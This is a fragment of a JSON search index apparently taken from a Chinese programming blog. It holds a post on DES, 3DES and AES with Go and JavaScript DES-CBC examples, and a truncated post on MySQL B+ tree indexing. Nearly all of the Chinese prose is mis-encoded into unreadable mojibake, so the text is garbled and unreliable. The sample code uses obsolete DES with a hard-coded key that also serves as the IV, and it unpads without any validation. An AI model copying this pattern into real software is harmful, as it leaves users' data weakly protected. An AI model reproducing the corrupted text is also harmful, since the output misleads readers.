å¯†ç®—æ³•ã€‚ç”±äºè®¡ç®—æœºè¿ç®—èƒ½åŠ›çš„å¢å¼ºï¼ŒåŸç‰ˆ DES å¯†ç çš„å¯†é’¥é•¿åº¦å˜å¾—å®¹æ˜“è¢«æš´åŠ›ç ´è§£ï¼›3DES å³æ˜¯è®¾è®¡ç”¨æ¥æä¾›ä¸€ç§ç›¸å¯¹ç®€å•çš„æ–¹æ³•ï¼Œå³é€šè¿‡å¢åŠ  DES çš„å¯†é’¥é•¿åº¦æ¥é¿å…ç±»ä¼¼çš„æ”»å‡»ï¼Œè€Œä¸æ˜¯è®¾è®¡ä¸€ç§å…¨æ–°çš„å—å¯†ç ç®—æ³•ã€‚\n+ AES å…¨ç§°æ˜¯ Advanced Encryption Standardï¼Œç¿»è¯‘è¿‡æ¥æ˜¯é«˜çº§åŠ å¯†æ ‡å‡†ï¼Œå®ƒæ˜¯ç”¨æ¥æ›¿ä»£ä¹‹å‰çš„ DES åŠ å¯†ç®—æ³•çš„ã€‚AES åŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§è¦é«˜äº DES å’Œ 3DESï¼Œæ‰€ä»¥ AES å·²ç»æˆä¸ºäº†ä¸»è¦çš„å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚+\n+ 2000å¹´ä»£ï¼ŒDESé€æ¸è¢«[3DES](https://zh.wikipedia.org/wiki/3DES)æ›¿ä»£ã€‚2010å¹´ä»£ï¼Œ3DESé€æ¸è¢«æ›´å®‰å…¨çš„[é«˜çº§åŠ å¯†æ ‡å‡†](https://zh.wikipedia.org/wiki/é«˜ç´šåŠ å¯†æ¨™æº–)ï¼ˆAESï¼‰æ›¿ä»£ã€‚\n\n<!-- more -->\n\n### 1.2 DESåŠ å¯†æ¨¡å¼\n\n##### 1.2.1 ECB\n\nECBæ¨¡å¼åˆç§°ç”µå­å¯†ç æœ¬æ¨¡å¼ï¼šElectronic codebookï¼Œæ˜¯æœ€ç®€å•çš„å—å¯†ç åŠ å¯†æ¨¡å¼ï¼ŒåŠ å¯†å‰æ ¹æ®åŠ å¯†å—å¤§å°åˆ†æˆè‹¥å¹²å—ï¼Œä¹‹åå°†æ¯å—ä½¿ç”¨ç›¸åŒçš„å¯†é’¥å•ç‹¬åŠ å¯†ï¼Œè§£å¯†åŒç†ã€‚\n\n**ä¼˜ç‚¹ï¼š**\n\n+ ç®€å•ï¼›\n\n+ æœ‰åˆ©äºå¹¶è¡Œè®¡ç®—ï¼›\n\n\n+ è¯¯å·®ä¸ä¼šè¢«ä¼ é€’ï¼›\n\n**ç¼ºç‚¹ï¼š**\n\n+ ä¸èƒ½éšè—æ˜æ–‡çš„æ¨¡å¼ï¼›\n\n+ å¯èƒ½å¯¹æ˜æ–‡è¿›è¡Œä¸»åŠ¨æ”»å‡»\n\n  \n\n##### 1.2.2 CBC\n\nå¯†ç åˆ†ç»„é“¾æ¥ï¼ˆCBCï¼ŒCipher-block chainingï¼‰æ¨¡å¼ï¼Œç”±IBMäº1976å¹´å‘æ˜ï¼Œæ¯ä¸ªæ˜æ–‡å—å…ˆä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–åï¼Œå†è¿›è¡ŒåŠ å¯†ã€‚åœ¨è¿™ç§æ–¹æ³•ä¸­ï¼Œæ¯ä¸ªå¯†æ–‡å—éƒ½ä¾èµ–äºå®ƒå‰é¢çš„æ‰€æœ‰æ˜æ–‡å—ã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯æ¯æ¡æ¶ˆæ¯çš„å”¯ä¸€æ€§ï¼Œåœ¨ç¬¬ä¸€ä¸ªå—ä¸­éœ€è¦ä½¿ç”¨åˆå§‹åŒ–å‘é‡IV\n\n**ä¼˜ç‚¹**ï¼š\n\n+ ä¸å®¹æ˜“ä¸»åŠ¨æ”»å‡»ï¼Œå®‰å…¨æ€§å¥½äºECBï¼Œæ˜¯SSLã€IPSecçš„æ ‡å‡†ï¼›\n\n**ç¼ºç‚¹**ï¼š\n\n+ ä¸åˆ©äºå¹¶è¡Œè®¡ç®—ï¼›\n+ è¯¯å·®ä¼ é€’ï¼›\n+ éœ€è¦åˆå§‹åŒ–å‘é‡IVï¼›\n\n# 2. å®ç°\n\n### 2.1 golangä»£ç \n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"crypto/des\"\n\t\"crypto/cipher\"\n\t\"encoding/base64\"\n\t\"fmt\"\n)\n\nfunc DesEncryption(key, iv, plainText []byte) ([]byte, error) {\n\tblock, err := des.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tblockSize := block.BlockSize()\n\torigData := PKCS5Padding(plainText, blockSize)\n\tblockMode := cipher.NewCBCEncrypter(block, iv)\n\tcryted := make([]byte, len(origData))\n\tblockMode.CryptBlocks(cryted, origData)\n\treturn cryted, nil\n}\n\nfunc DesDecryption(key, iv, cipherText []byte) ([]byte, error) {\n\tblock, err := des.NewCipher(key)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tblockMode := cipher.NewCBCDecrypter(block, iv)\n\torigData := make([]byte, len(cipherText))\n\tblockMode.CryptBlocks(origData, cipherText)\n\torigData = PKCS5UnPadding(origData)\n\treturn origData, nil\n}\n\nfunc PKCS5Padding(src []byte, blockSize int) []byte {\n\tpadding := blockSize - len(src)%blockSize\n\tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n\treturn append(src, padtext...)\n}\n\nfunc PKCS5UnPadding(src []byte) []byte {\n\tlength := len(src)\n\tunpadding := int(src[length-1])\n\treturn src[:(length - unpadding)]\n}\n\n\nfunc main() {\n\toriginalText := \"Hello world\"\n\tvar key = \"12345678\"\n\n\tfmt.Println(\"åŠ å¯†å‰:\",originalText)\n\tcryptoText,_ := DesEncryption([]byte(key), []byte(key), []byte(originalText))\n\tfmt.Println(\"åŠ å¯†å:\", base64.StdEncoding.EncodeToString(cryptoText))\n\tdecryptedText,_ := DesDecryption([]byte(key),[]byte(key), cryptoText)\n\tfmt.Println(\"è§£å¯†å:\", string(decryptedText))\n}\n```\n\nè¿è¡Œå:\n\n```ini\nåŠ å¯†å‰: Hello world\nåŠ å¯†å: SVd7Nf/Kw6itcZ02PHCmKQ==\nè§£å¯†å: Hello world\n```\n\n\n\n### 2.2 javascriptä»£ç \n\n```html\n<script src=\"https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/crypto-js.js\"></script>\n\n<script>\n    var key = \"12345678\"\n\n    function encryptByDESModeCBC(message) {\n        var keyHex = CryptoJS.enc.Utf8.parse(key);\n        var ivHex = CryptoJS.enc.Utf8.parse(key);\n        encrypted = CryptoJS.DES.encrypt(message, keyHex, {\n                iv:ivHex,\n                mode: CryptoJS.mode.CBC,\n                padding:CryptoJS.pad.Pkcs7\n            }\n        );\n        return encrypted.ciphertext.toString(CryptoJS.enc.Base64);\n    }\n\n    function decryptByDESModeCBC(ciphertext) {\n        var keyHex = CryptoJS.enc.Utf8.parse(key);\n        var ivHex = CryptoJS.enc.Utf8.parse(key);\n        var decrypted = CryptoJS.DES.decrypt({\n            ciphertext: CryptoJS.enc.Base64.parse(ciphertext)\n        }, keyHex, {\n            iv: ivHex,\n            mode: CryptoJS.mode.CBC,\n            padding: CryptoJS.pad.Pkcs7\n        });\n        return decrypted.toString(CryptoJS.enc.Utf8);\n    }\n\n    var oriText = \"Hello world\"\n    console.log(\"åŠ å¯†å‰:\", oriText)\n    var encText =  encryptByDESModeCBC(oriText)\n    console.log(\"åŠ å¯†å:\", encText)\n    var decText =  decryptByDESModeCBC(encText)\n    console.log(\"è§£å¯†å:\",decText)\n\n</script>\n\n```\n\nè¿è¡Œå:\n\n```ini\nåŠ å¯†å‰: Hello world\nåŠ å¯†å: SVd7Nf/Kw6itcZ02PHCmKQ==\nè§£å¯†å: Hello world\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96","tags":["åŠ å¯†"],"categories":["web"]},{"title":"mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯","url":"%2Fp%2F84544518.html","content":"\n# 1. ç´¢å¼•åˆ†ç±»\n\nç´¢å¼•æ˜¯ä¸€ç§å¿«é€ŸæŸ¥è¯¢è¡¨ä¸­å†…å®¹çš„æœºåˆ¶ï¼Œç±»ä¼¼äºæ–°åå­—å…¸çš„ç›®å½•ã€‚\n\n### 1.1 å­˜å‚¨\n\n+ B+ tree ç´¢å¼•ï¼ˆä¸‹æ–‡é‡ç‚¹è®²ï¼‰\n\n- å“ˆå¸Œç´¢å¼•ï¼šä¸éœ€è¦åšæ’åº**ã€**èŒƒå›´æŸ¥è¯¢çš„éœ€æ±‚ã€‚\n\n- Full-index å…¨æ–‡ç´¢å¼•\n\n<!-- more -->\n\n### 1.2 åº”ç”¨\n\n- æ™®é€šç´¢å¼•ï¼šå³ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥æœ‰å¤šä¸ªå•åˆ—ç´¢å¼•ã€‚\n\n- å”¯ä¸€ç´¢å¼•ï¼šç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ã€‚\n  \n- å¤åˆç´¢å¼•ï¼šä¸€ä¸ªç´¢å¼•åŒ…å«å¤šä¸ªåˆ—ã€‚\n\n> å”¯ä¸€ç´¢å¼•å’Œä¸»é”®ç´¢å¼•åŒºåˆ«ï¼šä¸»é”®å°±æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œä½†æ˜¯å”¯ä¸€ç´¢å¼•ä¸ä¸€å®šæ˜¯ä¸»é”®ã€‚å”¯ä¸€ç´¢å¼•å¯ä»¥ä¸ºç©ºï¼Œä½†æ˜¯ç©ºå€¼åªèƒ½æœ‰ä¸€ä¸ªï¼Œä¸»é”®ä¸èƒ½ä¸ºç©ºã€‚\n\n### 1.3 èšé›†\n\n- èšé›†ç´¢å¼•\n\n  è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸€è‡´ã€‚(ç±»ä¼¼æ‹¼éŸ³æŸ¥å­—)\n\n  1. ä¸€ä¸ªè¡¨ä¸­åªèƒ½æ‹¥æœ‰ä¸€ä¸ªèšé›†ç´¢å¼•ã€‚\n\n  2. é»˜è®¤æ˜¯åœ¨ä¸»é”®ä¸Šå»ºç«‹èšé›†ç´¢å¼•çš„ï¼Œæ²¡æœ‰ä¸»é”®æ˜¯å”¯ä¸€ç´¢å¼•ï¼Œå†æˆ–è€…æ˜¯`_rowid`ã€‚\n\n  3. èšé›†ç´¢å¼•è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸€è‡´ï¼Œæ‰€ä»¥æŸ¥è¯¢æ•ˆç‡å¿«ï¼Œå› ä¸ºåªè¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªç´¢å¼•å€¼è®°å½•ï¼Œå…¶ä½™çš„è¿ç»­æ€§çš„è®°å½•åœ¨ç‰©ç†è¡¨ä¸­ä¹Ÿä¼šè¿ç»­å­˜æ”¾ï¼Œä¸€èµ·å°±å¯ä»¥æŸ¥è¯¢åˆ°ã€‚\n\n  4. ç¼ºç‚¹æ˜¯æ–°å¢æ¯”è¾ƒæ…¢ï¼Œå› ä¸ºä¸ºäº†ä¿è¯è¡¨ä¸­è®°å½•çš„ç‰©ç†é¡ºåºå’Œç´¢å¼•é¡ºåºä¸€è‡´ï¼Œåœ¨è®°å½•æ’å…¥çš„æ—¶å€™ï¼Œä¼šå¯¹æ•°æ®é¡µé‡æ–°æ’åºã€‚\n\n  \n\n- éèšé›†ç´¢å¼•\n\n  è¡¨è®°å½•çš„æ’åˆ—é¡ºåºå’Œç´¢å¼•çš„æ’åˆ—é¡ºåºä¸ä¸€è‡´ã€‚(ç±»ä¼¼åæ—éƒ¨é¦–æŸ¥å­—)\n\n  1. ä¸€ä¸ªè¡¨ä¸­å¯ä»¥æ‹¥æœ‰å¤šä¸ªéèšé›†ç´¢å¼•ã€‚\n\n  2. ç´¢å¼•çš„é€»è¾‘é¡ºåºä¸ç£ç›˜ä¸Šè¡Œçš„ç‰©ç†å­˜å‚¨é¡ºåºä¸åŒï¼Œéèšé›†ç´¢å¼•åœ¨å¶å­èŠ‚ç‚¹å­˜å‚¨çš„æ˜¯ä¸»é”®å’Œç´¢å¼•åˆ—ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨éèšé›†ç´¢å¼•æŸ¥è¯¢æ•°æ®æ—¶ï¼Œéœ€è¦æ‹¿åˆ°å¶å­ä¸Šçš„ä¸»é”®å†å»è¡¨ä¸­æŸ¥åˆ°æƒ³è¦æŸ¥æ‰¾çš„æ•°æ®ã€‚è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å›è¡¨ã€‚\n\n\n\n# 2. Bæ ‘å’ŒB+æ ‘\n\n### 2.1 B æ ‘ï¼ˆä¹Ÿå†™ä½œ B- æ ‘ï¼‰\n\n- **å…³é”®å­—åˆ†å¸ƒåœ¨æ•´æ£µæ ‘çš„æ‰€æœ‰èŠ‚ç‚¹**ã€‚\n- ä»»ä½•ä¸€ä¸ªå…³é”®å­— å‡ºç°ä¸”åªå‡ºç°åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸­ã€‚\n- æœç´¢æœ‰å¯èƒ½åœ¨ éå¶å­èŠ‚ç‚¹ ç»“æŸã€‚\n- å…¶æœç´¢æ€§èƒ½ç­‰ä»·äºåœ¨å…³é”®å­—å…¨é›†å†…åšä¸€æ¬¡äºŒåˆ†æŸ¥æ‰¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![1](mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/2.png)\n\n### 2.2 B+ æ ‘\n\n- éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆä¸å…³é”®å­—ä¸ªæ•°ç›¸åŒã€‚\n- éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆ P[i]ï¼ŒæŒ‡å‘å…³é”®å­—å±äº [k[i],K[i+1]) çš„å­æ ‘ï¼ˆæ³¨æ„ï¼šåŒºé—´æ˜¯å‰é—­åå¼€)ã€‚\n- ä¸ºæ‰€æœ‰å¶å­èŠ‚ç‚¹å¢åŠ ä¸€ä¸ªé“¾æŒ‡é’ˆã€‚\n- **æ‰€æœ‰å…³é”®å­—éƒ½åœ¨å¶å­èŠ‚ç‚¹å‡ºç°ã€‚**\n\n![1](mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/3.png)\n\n\n\n### 2.3  å¯¹æ¯”äºŒå‰æ ‘\n\nBä¸æ˜¯ä»£è¡¨äºŒå‰ï¼ˆbinaryï¼‰ï¼Œè€Œæ˜¯ä»£è¡¨å¹³è¡¡ï¼ˆbalanceï¼‰ã€‚\n\nå®é™…å®ç°B+Treeè¿˜éœ€è¦ä½¿ç”¨å¦‚ä¸‹æŠ€å·§ï¼š\n\næ¯æ¬¡æ–°å»ºèŠ‚ç‚¹æ—¶ï¼Œç›´æ¥ç”³è¯·ä¸€ä¸ªé¡µçš„ç©ºé—´ï¼Œè¿™æ ·å°±ä¿è¯ä¸€ä¸ªèŠ‚ç‚¹ç‰©ç†ä¸Šä¹Ÿå­˜å‚¨åœ¨ä¸€ä¸ªé¡µé‡Œï¼ŒåŠ ä¹‹è®¡ç®—æœºå­˜å‚¨åˆ†é…éƒ½æ˜¯æŒ‰é¡µå¯¹é½çš„ï¼Œå°±å®ç°äº†ä¸€ä¸ªnodeåªéœ€ä¸€æ¬¡I/Oã€‚\n\nB+Treeä¸­ä¸€æ¬¡æ£€ç´¢æœ€å¤šéœ€è¦h-1æ¬¡I/Oï¼ˆæ ¹èŠ‚ç‚¹å¸¸é©»å†…å­˜ï¼‰ï¼Œæ¸è¿›å¤æ‚åº¦ä¸ºO(h)=O(logdN)O(h)=O(logdN)ã€‚ä¸€èˆ¬å®é™…åº”ç”¨ä¸­ï¼Œå‡ºåº¦d(èŠ‚ç‚¹æ•°)æ˜¯éå¸¸å¤§çš„æ•°å­—ï¼Œé€šå¸¸è¶…è¿‡100ï¼Œå› æ­¤héå¸¸å°ï¼ˆé€šå¸¸ä¸è¶…è¿‡3ï¼‰ã€‚\n\nè€Œçº¢é»‘æ ‘è¿™ç§ç»“æ„ï¼Œhæ˜æ˜¾è¦æ·±çš„å¤šã€‚ç”±äºé€»è¾‘ä¸Šå¾ˆè¿‘çš„èŠ‚ç‚¹ï¼ˆçˆ¶å­ï¼‰ç‰©ç†ä¸Šå¯èƒ½å¾ˆè¿œï¼Œæ— æ³•åˆ©ç”¨å±€éƒ¨æ€§ï¼Œæ‰€ä»¥çº¢é»‘æ ‘çš„I/Oæ¸è¿›å¤æ‚åº¦ä¹Ÿä¸ºO(h)ï¼Œæ•ˆç‡æ˜æ˜¾æ¯”B+Treeå·®å¾ˆå¤šã€‚\n\n\n\n### 2.4 å¯¹æ¯”Bæ ‘\n\nB+æ ‘çš„é«˜åº¦æ¯”è¾ƒç¨³å®šï¼Œå› ä¸ºå®ƒçš„éå¶å­èŠ‚ç‚¹ä¸ä¼šä¿å­˜æ•°æ®ï¼Œåªä¿å­˜é”®å€¼å’ŒæŒ‡é’ˆçš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªé¡µèƒ½æ‰¿è½½å¤§é‡çš„æ•°æ®ã€‚\n\nBæ ‘å®ƒçš„éå¶å­èŠ‚ç‚¹ä¹Ÿä¼šä¿å­˜æ•°æ®çš„ï¼ŒåŒæ ·çš„ä¸€è¡Œæ•°æ®å¤§å°æ˜¯1kbï¼Œé‚£ä¹ˆå®ƒä¸€é¡µæœ€å¤šä¹Ÿåªèƒ½ä¿å­˜16ä¸ªæŒ‡é’ˆï¼Œåœ¨å¤§é‡æ•°æ®çš„æƒ…å†µä¸‹ï¼Œæ ‘é«˜å°±ä¼šé€Ÿåº¦è†¨èƒ€ï¼Œå¯¼è‡´IOæ¬¡æ•°å°±ä¼šå¾ˆå¤šï¼ŒæŸ¥è¯¢å°±ä¼šå˜å¾—å¾ˆæ…¢ã€‚\n\n\n\n1. B+ æ ‘çš„ç£ç›˜è¯»å†™ä»£ä»·æ›´ä½ã€‚\n\n   B+ æ ‘çš„å†…éƒ¨æ²¡æœ‰æŒ‡å‘å…³é”®å­—å…·ä½“ä¿¡æ¯çš„æŒ‡é’ˆï¼Œæ‰€ä»¥å…¶å†…éƒ¨èŠ‚ç‚¹ç›¸å¯¹ B æ ‘æ›´å°ï¼Œå¦‚æœæŠŠæ‰€æœ‰å…³é”®å­—å­˜æ”¾åœ¨åŒä¸€å—ç›˜ä¸­ï¼Œé‚£ä¹ˆç›˜ä¸­æ‰€èƒ½å®¹çº³çš„å…³é”®å­—æ•°é‡ä¹Ÿè¶Šå¤šï¼Œä¸€æ¬¡æ€§è¯»å…¥å†…å­˜çš„éœ€è¦æŸ¥æ‰¾çš„å…³é”®å­—ä¹Ÿå°±è¶Šå¤šï¼Œç›¸åº”çš„ï¼ŒIO è¯»å†™æ¬¡æ•°å°±é™ä½äº†ã€‚\n\n2. æ ‘çš„æŸ¥è¯¢æ•ˆç‡æ›´åŠ ç¨³å®šã€‚\n\n   B+ æ ‘æ‰€æœ‰æ•°æ®éƒ½å­˜åœ¨äºå¶å­èŠ‚ç‚¹ï¼Œæ‰€æœ‰å…³é”®å­—æŸ¥è¯¢çš„è·¯å¾„é•¿åº¦ç›¸åŒï¼Œæ¯æ¬¡æ•°æ®çš„æŸ¥è¯¢æ•ˆç‡ç›¸å½“ã€‚è€Œ B æ ‘å¯èƒ½åœ¨éå¶å­èŠ‚ç‚¹å°±åœæ­¢æŸ¥æ‰¾äº†ï¼Œæ‰€ä»¥æŸ¥è¯¢æ•ˆç‡ä¸å¤Ÿç¨³å®šã€‚\n\n3. **B+ æ ‘åªéœ€è¦å»éå†å¶å­èŠ‚ç‚¹å°±å¯ä»¥å®ç°æ•´æ£µæ ‘çš„éå†ã€‚**\n\n<img src=\"mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/5.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 2.5 B+ æ ‘å­˜å‚¨å¤šå°‘æ•°æ®\n\nInnoDBå­˜å‚¨å¼•æ“å®ƒä¹Ÿæ˜¯æœ‰æœ€å°å­˜å‚¨å•ä½çš„ï¼Œå«åšé¡µï¼ˆPageï¼‰ï¼Œé»˜è®¤å¤§å°æ˜¯16kbã€‚é¡µå¯ä»¥æ”¾ä¸€è¡Œä¸€è¡Œçš„æ•°æ®ï¼ˆå¶å­èŠ‚ç‚¹ï¼‰ï¼Œä¹Ÿå¯ä»¥æ”¾ä¸»é”®+æŒ‡é’ˆï¼ˆéå¶å­èŠ‚ç‚¹ï¼‰ã€‚\n\nä¸ºäº†å‡å°‘ç£ç›˜I/Oã€‚ç£ç›˜å¾€å¾€ä¸æ˜¯ä¸¥æ ¼æŒ‰éœ€è¯»å–ï¼Œè€Œæ˜¯æ¯æ¬¡éƒ½ä¼šé¢„è¯»ï¼Œå³ä½¿åªéœ€è¦ä¸€ä¸ªå­—èŠ‚ï¼Œç£ç›˜ä¹Ÿä¼šä»è¿™ä¸ªä½ç½®å¼€å§‹ï¼Œé¡ºåºå‘åè¯»å–ä¸€å®šé•¿åº¦çš„æ•°æ®æ”¾å…¥å†…å­˜ã€‚\n\nè¿™æ ·åšçš„ç†è®ºä¾æ®æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­è‘—åçš„å±€éƒ¨æ€§åŸç†ï¼šå½“ä¸€ä¸ªæ•°æ®è¢«ç”¨åˆ°æ—¶ï¼Œå…¶é™„è¿‘çš„æ•°æ®ä¹Ÿé€šå¸¸ä¼šé©¬ä¸Šè¢«ä½¿ç”¨ã€‚\n\né¢„è¯»çš„é•¿åº¦ä¸€èˆ¬ä¸ºé¡µï¼ˆpageï¼‰çš„æ•´å€æ•°ã€‚é¡µæ˜¯è®¡ç®—æœºç®¡ç†å­˜å‚¨å™¨çš„é€»è¾‘å—ï¼Œç¡¬ä»¶åŠæ“ä½œç³»ç»Ÿå¾€å¾€å°†ä¸»å­˜å’Œç£ç›˜å­˜å‚¨åŒºåˆ†å‰²ä¸ºè¿ç»­çš„å¤§å°ç›¸ç­‰çš„å—ï¼Œæ¯ä¸ªå­˜å‚¨å—ç§°ä¸ºä¸€é¡µï¼ˆåœ¨è®¸å¤šæ“ä½œç³»ç»Ÿä¸­ï¼Œé¡µå¾—å¤§å°é€šå¸¸ä¸º4kï¼‰ã€‚ InnoDB å¼•æ“ä¸€ä¸ªé¡µçš„å¤§å°æ˜¯ 16Kã€‚(mysql5.7åï¼Œæä¾›äº†ä¸€ä¸ªè®¾å®špageå¤§å°çš„å‚æ•°innodb_page_sizeï¼Œé»˜è®¤å€¼æ˜¯16Kã€‚)\n\n<img src=\"mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\nå‡å¦‚ä¸€è¡Œæ•°æ®å¤§å°æ˜¯1kï¼Œé‚£ä¹ˆç†è®ºä¸Šä¸€é¡µå°±å¯ä»¥æ”¾16æ¡æ•°æ®ã€‚é‚£ä¸€é¡µå¯ä»¥æ”¾å¤šå°‘ä¸»é”®+æŒ‡é’ˆå‘¢ï¼Ÿ\n\nå‡å¦‚æˆ‘ä»¬çš„ä¸»é”®idä¸ºbigintç±»å‹ï¼Œé•¿åº¦ä¸º8å­—èŠ‚ï¼Œè€ŒæŒ‡é’ˆå¤§å°åœ¨InnoDBæºç ä¸­è®¾ç½®ä¸º6å­—èŠ‚ã€‚è¿™æ ·ç®—ä¸‹æ¥å°±æ˜¯ 16384 / 14 = 1170ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªé¡µä¸Šå¯ä»¥å­˜æ”¾1170ä¸ªæŒ‡é’ˆã€‚\n\nä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå­˜æ”¾è®°å½•çš„é¡µï¼Œä¸€ä¸ªé¡µé‡Œå¯ä»¥æ”¾16æ¡æ•°æ®ï¼Œé‚£ä¹ˆä¸€é¢—é«˜åº¦ä¸º2çš„B+æ ‘å°±å¯ä»¥å­˜æ”¾ 1170 * 16=18720 æ¡æ•°æ®ã€‚åŒç†ï¼Œé«˜åº¦ä¸º3çš„B+æ ‘ï¼Œå°±å¯ä»¥å­˜æ”¾ 1170 * 1170 * 16 = 21902400 æ¡1kæ•°æ®çš„è®°å½•ã€‚\n\nç†è®ºä¸Šå°±æ˜¯è¿™æ ·ï¼Œåœ¨InnoDBå­˜å‚¨å¼•æ“ä¸­ï¼ŒB+æ ‘çš„é«˜åº¦ä¸€èˆ¬ä¸º2-4å±‚ï¼Œå°±å¯ä»¥æ»¡è¶³åƒä¸‡çº§æ•°æ®çš„å­˜å‚¨ã€‚ä½†æ˜¯æ¯ä¸ªé¡µä¸å¯èƒ½åªæ”¾æ•°æ®æœ¬èº«ã€‚é¦–å…ˆæ¯ä¸ªé¡µéƒ½æœ‰ä¸€äº›å›ºå®šçš„æ ¼å¼ï¼Œæ¯”å¦‚æ–‡ä»¶å¤´éƒ¨ã€é¡µé¢å¤´éƒ¨ã€æ–‡ä»¶å°¾éƒ¨è¿™äº›ï¼Œæ‰€ä»¥å®é™…ä¼šæ¯”è¾ƒå°‘ä¸€äº›ã€‚\n\nå®é™…æµ‹è¯•ä¸­å‘ç°:  æ•°æ®å¤§æ¦‚åœ¨1300ä¸‡å·¦å³ï¼ŒB+æ ‘å°±ä¼šå¢åŠ æ ‘é«˜åˆ°4å±‚ã€‚\n\næŸ¥æ‰¾æ•°æ®çš„æ—¶å€™ï¼Œä¸€æ¬¡é¡µçš„æŸ¥æ‰¾ä»£è¡¨ä¸€æ¬¡IOï¼Œé‚£æˆ‘ä»¬é€šè¿‡ä¸»é”®ç´¢å¼•æŸ¥è¯¢çš„æ—¶å€™ï¼Œå…¶å®æœ€å¤šåªéœ€è¦2-4æ¬¡IOå°±å¯ä»¥äº†ã€‚\n\n\n\n# 3. èšé›†ç´¢å¼•å’Œéèšé›†ç´¢å¼•\n\n### 3.1 InnoDB å’Œ MyISAM åŒºåˆ«\n\n<img src=\"mysqlç´¢å¼•æœºåˆ¶å’Œä¼˜åŒ–æŠ€æœ¯/4.png\" alt=\"1\" style=\"zoom:67%;\" />\n\nInnoDB æ˜¯ç”±ä¸€ä¸ªèšé›†ç´¢å¼•å’Œéèšé›†ç´¢å¼•æ„æˆã€‚MyISAM å…¨æ˜¯éèšé›†ç´¢å¼•ã€‚\n\nä½†æ˜¯æ— è®ºæ˜¯ä»€ä¹ˆï¼Œåº•å±‚çš„æ•°æ®ç»“æ„éƒ½æ˜¯ç”¨ B+æ ‘å®ç°çš„ã€‚\n\n##### 1. MyISAM éèšé›†ç´¢å¼•\n\n+ MyISAMçš„ç´¢å¼•æ–¹å¼ä¹Ÿå«åšâ€œéèšé›†â€çš„ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆç§°å‘¼æ˜¯ä¸ºäº†ä¸InnoDBçš„èšé›†ç´¢å¼•åŒºåˆ†ã€‚\n\n+ éèšç°‡ç´¢å¼•çš„ä¸»é”®ç´¢å¼•å’Œè¾…åŠ©ç´¢å¼•ä¸¤æ£µB+æ ‘çœ‹ä¸Šå»æ²¡ä»€ä¹ˆä¸åŒï¼ŒèŠ‚ç‚¹çš„ç»“æ„å®Œå…¨ä¸€è‡´åªæ˜¯å­˜å‚¨çš„å†…å®¹ä¸åŒè€Œå·²ã€‚\n\n+ ä¸»é”®ç´¢å¼•B+æ ‘çš„èŠ‚ç‚¹å­˜å‚¨äº†ä¸»é”®ï¼Œè¾…åŠ©é”®ç´¢å¼•B+æ ‘å­˜å‚¨äº†è¾…åŠ©é”®ã€‚è¡¨æ•°æ®å­˜å‚¨åœ¨ç‹¬ç«‹çš„åœ°æ–¹ï¼Œè¿™ä¸¤é¢—B+æ ‘çš„å¶å­èŠ‚ç‚¹éƒ½ä½¿ç”¨ä¸€ä¸ªåœ°å€æŒ‡å‘çœŸæ­£çš„è¡¨æ•°æ®ï¼Œå¯¹äºè¡¨æ•°æ®æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªé”®æ²¡æœ‰ä»»ä½•å·®åˆ«ã€‚\n\n+ ç”±äºç´¢å¼•æ ‘æ˜¯ç‹¬ç«‹çš„ï¼Œé€šè¿‡è¾…åŠ©é”®æ£€ç´¢æ— éœ€è®¿é—®ä¸»é”®çš„ç´¢å¼•æ ‘ã€‚\n+ ç´¢å¼•æ–‡ä»¶ï¼ˆ.MYIï¼‰å’Œæ•°æ®æ–‡ä»¶ï¼ˆ.MYDï¼‰æ–‡ä»¶æ˜¯åˆ†ç¦»çš„,  ç´¢å¼•æ–‡ä»¶ä»…ä¿å­˜æ•°æ®è®°å½•çš„åœ°å€(æŒ‡é’ˆå»æŸ¥æ‰¾)ã€‚\n\n##### 2. InnoDB èšé›†ç´¢å¼• \n\n+ èšé›†ç´¢å¼•ï¼ˆclustered indexï¼‰å°±æ˜¯æŒ‰ç…§æ¯å¼ è¡¨çš„ä¸»é”®æ„é€ ä¸€æ£µB+æ 